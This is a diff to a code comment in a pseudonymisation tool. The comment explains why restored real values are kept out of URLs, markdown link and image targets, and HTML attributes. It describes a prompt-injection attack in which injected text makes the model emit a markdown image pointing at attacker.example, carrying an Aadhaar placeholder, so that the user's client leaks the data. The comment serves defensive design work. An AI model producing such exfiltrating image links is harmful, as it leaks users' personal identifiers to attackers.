@@ -1,6 +1,6 @@
 // Regions of text where a restored value must not be written back
-// (restoration safety, CLAUDE.md): URLs, markdown link/image targets, and
-// HTML attribute values (including `mailto:`). The concrete attack this
+// (restoration safety: docs/user-manual.md and ADR-018): URLs, markdown
+// link/image targets, and HTML attribute values (including `mailto:`). The concrete attack this
 // defends against: injected text makes the model output
 // `![x](https://attacker.example/?d=[AADHAAR_1])`; if Pseudonym restored the
 // real value there, the user's own client would leak it fetching the image
